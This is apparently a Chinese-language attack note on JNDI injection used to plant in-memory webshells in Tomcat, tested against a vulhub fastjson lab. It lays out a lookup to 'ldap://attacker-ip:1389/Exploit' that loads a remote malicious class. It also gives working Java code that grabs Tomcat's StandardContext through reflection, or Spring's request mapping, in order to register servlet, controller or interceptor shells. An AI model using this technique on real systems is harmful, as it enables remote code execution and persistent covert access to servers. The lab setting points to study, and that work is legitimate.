## **JNDI注入内存马流程**
```
1. 恶意类 
2. 编译恶意类并托管在HTTP服务器
3. 启动LDAP服务并将引用指向上一步Http服务器中的恶意类

目标：
1. 客户端执行可控代码：context.lookup("ldap://attacker-ip:1389/Exploit")
2. JNDI客户端请求LDAP服务
3. LDAP返回恶意Reference对象
4. 客户端解析Reference时：
   1. 从codebase指定URL动态加载
   2. 实例化恶意类触发构造函数/static代码块
```
#### **问题解决**
1、解决代码执行：
下载的类中会被自动执行的地方只有三个代码块，分别是static{}，{}和无参构造方法。

2、获取StandardContext对象注册servlet系列马：
这三个地方可没有Request对象传入，我们要怎么拿到StandardContext呢？
参考这篇文章：<https://xz.aliyun.com/news/9369>
如果是Tomcat8.5以下可以通过这段代码拿到（重点要说明一下，版本不兼容的坑也就出现在这里）
```
WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
StandardRoot standardroot = (StandardRoot) webappClassLoaderBase.getResources();
StandardContext standardContext = (StandardContext) standardroot.getContext();
```
Tomcat9 (vulhub的fastjson1.2.24rce靶场，JdbcRowSetImpl打lookup的JNDI时) 
通过反射获取StandardContext。
```
public StandardContext getContextTomcat9() {
    WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();

    Field field = null;
    try {
        field = WebappClassLoaderBase.class.getDeclaredField("resources");
    } catch (NoSuchFieldException e) {
        throw new RuntimeException(e);
    }
    field.setAccessible(true);
    StandardRoot standardRoot = null;
    try {
        standardRoot = (StandardRoot) field.get(webappClassLoaderBase);
    } catch (IllegalAccessException e) {
        throw new RuntimeException(e);
    }
    StandardContext context = (StandardContext) standardRoot.getContext();
    return  context;
}
```
^
3、依赖了Spring框架：
如果依赖了Spring框架，可以直接获取RequestMappingHandlerMapping和Request直接注册控制器马或拦截器马。
```
(ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()
```
